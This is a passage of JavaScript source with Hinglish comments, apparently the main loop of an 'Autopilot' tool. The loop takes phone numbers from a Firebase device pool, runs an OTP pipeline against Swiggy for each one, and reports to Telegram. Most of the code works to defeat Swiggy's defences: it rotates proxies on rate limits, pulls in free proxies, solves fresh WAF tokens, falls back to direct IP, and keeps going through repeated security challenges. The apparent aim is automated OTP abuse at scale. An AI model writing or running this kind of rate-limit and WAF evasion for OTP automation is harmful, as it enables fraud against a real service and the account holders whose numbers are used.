                `› Total probes: ${state.scanTotalProbes} (repeated passes sameet — ye unique devices ki ginti nahi hai).`,
                sub(`Base window me na mile to isi pass par window double hogi: ${fmtDuration(otpCfg.activeWindowMs)} → ${fmtDuration(Number(otpCfg.activeWindowMs) * 2)} → ${fmtDuration(Number(otpCfg.activeWindowMs) * 4)} → …, Firebase dobara scan kiye baghair.`),
              ].join('\n'))), stopRows());
            }
          },
        });
        for (const id of r.probedDeviceIds || []) probedDevices.add(id);
        const at = Date.now();
        for (const f of r.fresh) {
          hotQueue.push({
            entry: f.entry,
            lastActivityMs: f.lastActivityMs,
            windowMs: Number(f.windowMs) || Number(r.widestWindowMs) || Number(otpCfg.activeWindowMs),
            checkedAt: at,
          });
        }
        state.scanTotalProbes = baseTotalProbes + (r.checked || 0);
        state.scanChecked = state.scanTotalProbes;
        state.scanUniqueChecked = [...probedDevices].filter((id) => passDeviceIds.has(id)).length;
        state.scanWindowMs = Number(r.fresh?.[0]?.windowMs) || Number(r.widestWindowMs) || Number(otpCfg.activeWindowMs) || 0;
        state.scanFresh = hotQueue.length;
        if (r.widened && r.fresh.length) {
          const ageMs = Math.max(0, at - (Number(r.fresh[0].lastActivityMs) || at));
          console.log(`[Autopilot] Scan: base window ≤${fmtDuration(otpCfg.activeWindowMs)} me koi nahi — isi cached pass se sabse taaza device liya (activity ~${fmtDuration(ageMs)} purani, ladder ≤${fmtDuration(state.scanWindowMs)}).`);
        }
        return r;
      } finally {
        state.scanning = false;
        state.scanFresh = hotQueue.length;
      }
    };

    // Pehla scan yahin — WAF warm-up ke parallel me hi (ensureWarm pehle
    // OTP se pehle token confirm karega).
    if (gateOn) await refillHotQueue();

    for (;;) {
      if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
      if (Date.now() - state.startedAt > maxMinutes * 60_000) { endReason = 'time'; break; }
      if (state.fresh >= target) { endReason = 'target'; break; }
      // Circuit breaker — proxy hone par zyada failures jhel sakte hain
      // (rotation se IP issue solve ho sakta hai), direct mode me 6.
      const failLimit = ps.enabled ? 10 : 6;
      if (state.consecutiveFails >= failLimit) { endReason = 'circuit_breaker'; break; }

      state.poolFresh = freshEntriesFrom(pool).length;

      // ---- Selection: pehle hot-queue (scan kiye hue zinda devices) ----
      let picked = takeFromHotQueue();

      if (!picked && gateOn) {
        // Refill is pass ke saare unprobed candidates cover kar sakta hai.
        // Agar mile hue entries ledger/caps ki wajah se skip ho jayein to
        // bina wait kiye baqi unprobed candidates bhi cover karo — probed
        // list sirf poora pass khatam hone ke baad hi clear hoti hai.
        while (!picked) {
          const scan = await refillHotQueue();
          picked = takeFromHotQueue();
          if (picked || state.stopRequested || scan?.exhausted || !(Number(scan?.checked) > 0)) break;
        }
        if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
        if (!picked) {
          if (retryLater.length) {
            picked = { entry: retryLater.shift().entry };
          } else {
            await refreshIfStale();
            state.poolFresh = freshEntriesFrom(pool).length;
            // Abhi koi device taazi activity nahi dikha raha — batch band
            // karne ke bajaye thodi der ruk kar DOBARA scan (device beech me
            // zinda ho sakta hai). Max 40 rounds × 15s ≈ 10 min.
            if (state.poolFresh > 0 && freshWaitRounds < 40) {
              freshWaitRounds++;
              await push(progressCard(section('🕐 Fresh Device Ka Wait', [
                `› Pass ${state.scanPass || 1} ke <b>${state.scanUniqueChecked || 0}/${state.scanTotalDevices || 0}</b> unique devices me koi usable last-activity timestamp hi nahi mila.`,
                `› Total probes: ${state.scanTotalProbes || state.scanChecked || 0} (repeated passes sameet). 15s ruk kar naya pass karunga (round ${freshWaitRounds}/40).`,
                sub('Timestamp wala device hota to isi pass par window double karke use le liya jata — dobara scan sirf nayi activity ke intezaar ke liye hai.'),
              ].join('\n'))), stopRows());
              await sleep(15_000, () => state.stopRequested);
              if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
              probedDevices.clear();
              staleThisRun.clear();
              state.scanPass = (state.scanPass || 1) + 1;
              state.scanUniqueChecked = 0;
              state.scanWindowMs = Number(otpCfg.activeWindowMs) || 0;
              continue;
            }
            endReason = 'pool-exhausted';
            break;
          }
        }
      }

      if (!picked && !gateOn) {
        // Gate OFF (window=0) — purana random pick, backward compatible
        let fresh = pickFreshList();
        if (!fresh.length) {
          if (retryLater.length) {
            fresh = [retryLater.shift().entry];
          } else {
            await refreshIfStale();
            fresh = pickFreshList();
            if (!fresh.length) { endReason = 'pool-exhausted'; break; }
          }
        }
        picked = { entry: fresh[0] };
      }

      if (!picked) { endReason = 'pool-exhausted'; break; }
      if (picked.lastActivityMs) freshWaitRounds = 0;

      const entry = picked.entry;
      state.current = { phone: entry.phone, startedAt: Date.now() };

      // WAF warm-up background me chal raha tha — pehla OTP iske baghair na jaye
      await ensureWarm();

      // Scan se aaye number ka prechecked last-seen pipeline ko dedo — wahi
      // device dobara fetch nahi hoga. Agar ye device base window miss ke
      // baad doubling ladder se mila hai to pipeline ko USI ladder window
      // ke hisaab se judge karo, warna scanner ka chuna hua device gate par
      // foran stale ho jayega. Precheck us window se bhi purana ho jaye to
      // pipeline live activity dobara fetch karegi.
      const numCfg = picked.lastActivityMs
        ? {
            ...otpCfg,
            precheckedLastActivityMs: picked.lastActivityMs,
            precheckedAt: picked.checkedAt || Date.now(),
            activeWindowMs: Math.max(Number(otpCfg.activeWindowMs) || 0, Number(picked.windowMs) || 0),
          }
        : otpCfg;

      const res = await processSingleNumber({
        userId,
        entry,
        otpCfg: numCfg,
        shouldAbort: () => state.stopRequested,
        report: async (text) => { await push(progressCard(text), stopRows()); },
      });

      state.current = null;
      const outcome = tally(res);
      if (outcome === 'failed' && res.phone) {
        failedAttemptsThisRun.set(res.phone, (failedAttemptsThisRun.get(res.phone) || 0) + 1);
      }
      // Console visibility — exact failure reason (Telegram card ke alawa),
      // taaki WAF/rate-limit/verify/OTP-miss ka farq turant dikhe logs me.
      if (!res.ok) {
        console.log(`[Autopilot] ${outcome} | ${res.kind} | ${res.phone} | ${String(res.reason || '').replace(/\s+/g, ' ').slice(0, 160)}`);
      }
      // Stale devices rapid-fire skip hote hain — har ek par card edit karne
      // se Telegram flood hoga. Unka count stats me dikhta hai, card nahi.
      if (outcome !== 'device_stale') {
        await push(progressCard(
          section(
            res.ok
              ? '✅ Number Done'
              : res.kind === 'skipped_delete_blocked'
                ? '⚠️ Skipped'
                : res.kind === 'aborted'
                  ? '⏹ Aborted'
                  : res.kind === 'deferred_swiggy_transient'
                    ? '↻ Temporary Swiggy Error — Retry Later'
                    : '× Result',
            [
            `📱 <b>Number:</b> <code>${esc(res.phone)}</code>`,
            `› <b>Outcome:</b> <code>${esc(res.kind)}</code>`,
            res.reason ? `<blockquote>${esc(String(res.reason).slice(0, 300))}</blockquote>` : '',
          ].filter(Boolean).join('\n'))
        ), stopRows());
      }

      // Engine-level reactions — "rukna hi na pare":
      //   rate-limit/WAF → TURANT proxy badal (nayi IP) + number defer kar
      //   (baad me isi run me dobara). Sirf tab ruk jab saare proxies side par.

      // Device stale — OTP gaya hi nahi. Is run me is number ko dobara mat
      // uthao, bina gap ke turant agla fresh device dhoondho.
      if (outcome === 'device_stale') {
        if (res.phone) staleThisRun.add(res.phone);
        continue;
      }

      // Swiggy/proxy temporary 5xx ya network error — number ki galti
      // nahi. Number isi run ki retry queue me (max 2 attempts), proxy
      // turant rotate, aur agar lagatar 3 hon to asal outage samajh kar
      // short cool-off. Pehle ye seedha Failed count hota tha aur proxy
      // 4 generic fails se pehle badalti hi nahi thi.
      if (outcome === 'swiggy_transient') {
        const attempt = (transientAttemptsThisRun.get(res.phone) || 0) + 1;
        if (res.phone) transientAttemptsThisRun.set(res.phone, attempt);
        const willRetry = Boolean(res.phone && attempt < 2);
        if (willRetry) deferNumber(entry, 'swiggy_transient');

        let next = null;
        if (ps.enabled) {
          next = rotateProxy(getBridgeProxyId(), { countRotation: true });
        }

        const needsCoolOff = !next || (state.transientStrikes || 0) >= 3;
        const waitMs = needsCoolOff ? transientSwiggyRetryWaitMs(state.transientStrikes) : 0;
        await push(progressCard(section('↻ Temporary Error — Number Safe Hai', [
          `› ${res.httpStatus ? `HTTP ${res.httpStatus}` : 'Network/5xx'} temporary error — ye number <b>FAILED count nahi</b> hua.`,
          willRetry
            ? `› Number retry queue me daal diya (attempt ${attempt}/2) — isi run me dobara ayega.`
            : `› Is number ke is run ke 2 temporary attempts ho gaye — ledger/pool me failed mark nahi kiya, agli run me mil sakta hai.`,
          next
            ? `› Proxy rotate kar diya: <code>${esc(next.label)}</code> (rotation #${state.proxyRotations})`
            : `› Doosri proxy available nahi — isi IP par cool-off ke baad aage badhunga.`,
          waitMs
            ? `› Lagatar ${state.transientStrikes} temporary errors — ${Math.round(waitMs / 1000)}s cool-off, phir batch khud aage badhega.`
            : `› Nayi IP par turant agla number — batch nahi rukega.`,
        ].join('\n'))), stopRows());

        if (waitMs) {
          await sleep(waitMs, () => state.stopRequested);
          if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
        }
        if (next) {
          try { await getLiveSwiggyWafToken(false, { solveBudgetMs: 25_000 }); } catch {}
        }
        state.consecutiveFails = 0;
        continue;
      }

      if (outcome === 'rate_limited') {
        // NOTE: rateStrikes tally() me already badhta hai — yahan dobara ++
        // karne se 3-strike wali limit 2 hits par hi band ho jati thi.
        // Number defer — isi run me aakhir me dobara try hoga
        if (res.phone) deferNumber(entry, 'rate_limited');

        if (ps.enabled) {
          const before = getBridgeProxyId();
          const next = rotateProxy(before, { countRotation: true });
          if (next) {
            await push(progressCard(section('🔀 Rate Limit — Proxy Rotate (zero wait)', [
              `› IP ko limit lagi — nayi IP (proxy) le liya: <code>${esc(next.label)}</code>`,
              `› Number defer kiya — baad me isi run me dobara.`,
              `› Strike ${state.rateStrikes} — batch nahi rukega.`,
            ].join('\n'))), stopRows());
            state.consecutiveFails = 0;
            continue; // turant agla number — ZERO wait
          }
        }

        // Direct mode (koi proxy nahi) — thoda ruk kar aage, warna poora IP
        // hi flagged ho jayega. 2 strikes se zyada = band.
        if (state.rateStrikes >= 3) { endReason = 'rate_limited'; break; }
        const backoff = Math.min(backoffMs, 5 * 60_000); // max 5 min (pehle 15)
        await push(progressCard(section('🚦 Swiggy Rate Limit — Short Backoff', [
          `› ${Math.round(backoff / 60000)} min ruk kar aage badhunga (strike ${state.rateStrikes}/3).`,
          sub('⚠️ Proxies add karne se ye wait bhi hat jayegi (⚙️ Settings → 🔀 Proxies).'),
        ].join('\n'))), stopRows());
        await sleep(backoff, () => state.stopRequested);
        if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
        continue;
      }

      // WAF cooldown — bridge ne request bhejne se mana kiya (IP/proxies
      // abhi garam). Number untouched; IP thandi hote hi khud aage badhega.
      // Cap bohot oonchi rakhi hai — batch is par kabhi "marna" nahi chahiye,
      // sirf waqti slow hona chahiye.
      if (outcome === 'waf_cooldown') {
        state.wafCooldowns++;
        if (state.wafCooldowns > 60) { endReason = 'waf_stuck'; break; }
        if (res.phone) deferNumber(entry, 'waf_cooldown');

        // Pool ke cooldown ka ahtaram karo lekin ek saath max 5 min — uske
        // baad token naya solve karke phir dekho (IP beech me thandi hogi).
        const cdMs = Math.min(Number(res.cooldownMs) || 120_000, 5 * 60_000);
        await push(progressCard(section('🛡 WAF Cooling — Short Wait', [
          `› Swiggy ki WAF abhi IP ko thanda hone de rahi hai — ~${Math.max(1, Math.round(cdMs / 60000))} min ruk kar aage badhunga.`,
          `› Number defer ho chuka hai (isi run me dobara ayega). Batch zinda hai.`,
          sub('Proxies add karoge to ye wait ghat kar seconds me aa jayegi (nayi IP = turant aage).'),
        ].join('\n'))), stopRows());
        await sleep(cdMs, () => state.stopRequested);
        if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
        const rotated = rotateProxy('', { countRotation: true }); // proxy mode me jo bhi free hua, use le lo
        if (!rotated) {
          // Koi proxy free nahi bachi (free wali jaldi marti hain) — background
          // me nayi free proxies le aao, batch ko roke baghair.
          void proxyPool.refreshFreeProxies({ want: 10 }).then((r) => {
            if (r?.added) { ps = proxyPool.proxySummary(); console.log(`[Autopilot] 🌐 ${r.added} free proxies aa gayin (clean ${r.keptClean || 0}, WAF-ready ${r.keptChallenged || 0}).`); }
          }).catch(() => {});
        }
        state.consecutiveFails = 0;
        continue;
      }

      // Security challenge (403) — batch NAHI marta. Number defer, IP ko
      // thanda hone do, naya token lo aur aage badho. Ek success par strikes
      // reset (tally me) — isliye milawat wali run kabhi is par nahi rukti.
      // Sirf 12 LAGATAR (bina ek bhi success ke) = IP asal me flagged hai;
      // us se zyada zor lagana block ko aur gehra karega, tab hi roko.
      // (Pehle: 4 par seedha batch band — boss ki sab se bari dikkat yahi thi.)
      if (outcome === 'security_challenge') {
        state.wafStrikes++;
        state.lastError = `security challenge ×${state.wafStrikes}`;
        if (res.phone) deferNumber(entry, 'security_challenge');
        if (state.wafStrikes >= 12) { endReason = 'security_challenge'; break; }

        const currentId = getBridgeProxyId();
        // Bridge khud bhi andar recovery me IP badal sakta hai — routeMode
        // ko asal current bridge route se sync rakho, andaza mat lagao.
        state.routeMode = currentId ? 'proxy' : (ps.enabled ? 'direct-fallback' : 'direct');
        if (currentId) {
          state.proxyChallenges = (state.proxyChallenges || 0) + 1;
          // Final challenged route ki quarantine guarantee (bridge ke kuch
          // paths pehle ye miss kar dete the). Bridge ne already cooldown
          // laga diya ho to double-count na karo.
          try {
            const info = proxyPool.listProxies().find((p) => p.id === currentId);
            if (!info || !info.cooldownLeftMs) proxyPool.markProxyWafHit(currentId, 10 * 60_000);
          } catch {}
        } else {
          state.directChallenges = (state.directChallenges || 0) + 1;
        }

        const action = securityRouteAction({
          proxyEnabled: Boolean(ps.enabled),
          usingDirectFallback: state.routeMode === 'direct-fallback',
          proxyChallenges: state.proxyChallenges || 0,
          directChallenges: state.directChallenges || 0,
        });

        const enterDirectFallback = async (reasonLine) => {
          setBridgeProxy(null);
          state.routeMode = 'direct-fallback';
          state.directChallenges = 0;
          state.proxyRotations = (state.proxyRotations || 0) + 1; // asal IP switch hua hai
          // Direct try hota rahe, peeche nayi free proxies bhi parkh lo.
          void proxyPool.refreshFreeProxies({ want: 10 }).then((r) => {
            if (r?.added) {
              ps = proxyPool.proxySummary();
              console.log(`[Autopilot] 🌐 Direct fallback ke peeche ${r.added} free proxies refresh.`);
            }
          }).catch(() => {});
          await push(progressCard(section('🌐 Proxies Garam — Direct IP Try', [
            `› Challenge mila (lagatar ${state.wafStrikes}). ${reasonLine}`,
            `› Ab Render ki <b>direct IP</b> + usi IP ka fresh WAF token try hoga (route switch #${state.proxyRotations}).`,
            `› Number defer hai — failed mark nahi hua. Direct par response milte hi challenge storm reset ho jayegi.`,
            sub('Peeche nayi free proxies bhi parkh raha hoon.'),
          ].join('\n'))), stopRows());
          try { await getLiveSwiggyWafToken(false, { solveBudgetMs: 25_000 }); } catch {}
        };

        if (action === 'direct_fallback') {
          await enterDirectFallback(`${state.proxyChallenges} proxy routes challenge de chuke hain — kharab free pool me aur nahi ghumunga.`);
          state.consecutiveFails = 0;
          continue;
        }

        if (action === 'restore_proxy') {
          const next = rotateProxy('', { countRotation: true });
          if (next) {
            state.proxyRotations = (state.proxyRotations || 0) + 1; // direct → proxy switch
            state.proxyChallenges = 0;
            await push(progressCard(section('🔀 Direct Bhi Garam — Best Proxy Wapas', [
              `› Direct IP par 2 challenges aaye — best available proxy le liya: <code>${esc(next.label)}</code>`,
              `› Picker ab fresh-token/Indian/clean route ko pehle rakhta hai (rotation #${state.proxyRotations}).`,
              `› Number defer hai, failed nahi.`,
            ].join('\n'))), stopRows());
            try { await getLiveSwiggyWafToken(false, { solveBudgetMs: 25_000 }); } catch {}
            state.consecutiveFails = 0;
            continue;
          }
          // Proxy bhi free nahi mili — neeche direct cooldown ladder chalega.
        } else if (action === 'rotate_proxy') {
          const next = rotateProxy(currentId, { countRotation: true });
          if (next) {
            await push(progressCard(section('🔀 Security Challenge — Proxy Rotate', [
              `› Challenge mila (lagatar ${state.wafStrikes}) — nayi IP: <code>${esc(next.label)}</code> (rotation #${state.proxyRotations})`,
              `› Number defer kiya — nayi IP + naye token ke saath aage badh raha hoon.`,
              sub('Batch nahi rukega. 3 proxy challenges ke baad direct fallback bhi try hoga.'),
            ].join('\n'))), stopRows());
            try { await getLiveSwiggyWafToken(false, { solveBudgetMs: 25_000 }); } catch {}
            state.consecutiveFails = 0;
            continue; // agla number nayi IP par (ye wala baad me dobara)
          }

          // Pehle yahan purani garam proxy hi chipki rehti thi aur code
          // "direct mode" samajh kar usi par token solve karta rehta tha.
          await enterDirectFallback('Doosri usable proxy abhi free nahi hai.');
          state.consecutiveFails = 0;
          continue;
        }

        // Direct mode / direct fallback — pehle IP ko THANDA hone do
        // (ladder + pool cooldown), phir naya token banao. Garam IP par
        // token banana bekar hota hai: solver visit bhi challenge kha sakti hai.
        const poolCd = (() => { try { return wafPool.cooldownRemainingMs?.() || 0; } catch { return 0; } })();
        const waitMs = wafChallengeWaitMs(state.wafStrikes, poolCd);
        await push(progressCard(section('🛡 Swiggy Security Check — IP Cool-Down', [
          `› Challenge mila (lagatar ${state.wafStrikes}) — direct IP abhi garam hai.`,
          `› ~${Math.max(1, Math.round(waitMs / 60000))} min ruk kar naya WAF token banao-ga, phir aage. Number defer ho gaya (baad me dobara).`,
          sub(ps.enabled
            ? 'Ek aur direct challenge par best proxy route dobara try hogi.'
            : 'Batch nahi rukega. Ek success milte hi ye ginti reset ho jati hai.'),
        ].join('\n'))), stopRows());
        await sleep(waitMs, () => state.stopRequested);
        if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
        try { await getLiveSwiggyWafToken(true, { solveBudgetMs: 25_000 }); } catch {}
        state.consecutiveFails = 0;
        continue; // thandi IP + fresh token → agla number
      }

      // Generic failure streak — pehle proxy badal kar dekho (IP issue ho
      // sakti hai), warna hi band. Pehle ye 6 par seedha band ho jata tha.
      if (outcome === 'failed' && state.consecutiveFails >= 4 && ps.enabled) {
        const next = rotateProxy(getBridgeProxyId(), { countRotation: true });
        if (next) {
          state.consecutiveFails = 0;
          if (state.proxyRotations > 25) { endReason = 'circuit_breaker'; break; }
          await push(progressCard(section('🔀 Fail Streak — Proxy Rotate', [
            `› ${state.consecutiveFails} lagatar failures — IP issue lag raha hai.`,
            `› Nayi IP: <code>${esc(next.label)}</code> (rotation #${state.proxyRotations}/25)`,
            sub('Batch chal raha hai.'),
          ].join('\n'))), stopRows());
          continue;
        }
      }

      // Gap between numbers (Swiggy ke liye thoda breathing room)
      if (state.fresh < target && !state.stopRequested) {
        const jitter = Math.floor(Math.random() * 3_000);
        await sleep(gapMs + jitter, () => state.stopRequested);
      }
    }
  } catch (err) {
    console.error('[Autopilot]', err?.stack || err?.message);
    state.lastError = String(err?.message || err);
    endReason = 'firebase';
    try {
      await push(section('× Autopilot Fatal Error', [
        `<blockquote>${esc(state.lastError)}</blockquote>`,
        sub('Console/logs me details. Config check karke dobara start karein.'),
      ].join('\n')), doneRows());
    } catch {}
  } finally {
    state.running = false;
    state.stopRequested = false;
    state.finishedAt = Date.now();
    if (!state.stopReason || ['target', 'time', 'manual'].includes(state.stopReason) === false) {
      state.stopReason = state.stopReason || endReason;
    } else {
      state.stopReason = endReason;
    }
  }

  // Final summary (fresh session list ke saath)
  try {
    await push(summaryCard(), doneRows());
  } catch {}

  return { ok: true, reason: endReason, snapshot: getAutopilotSnapshot() };
}
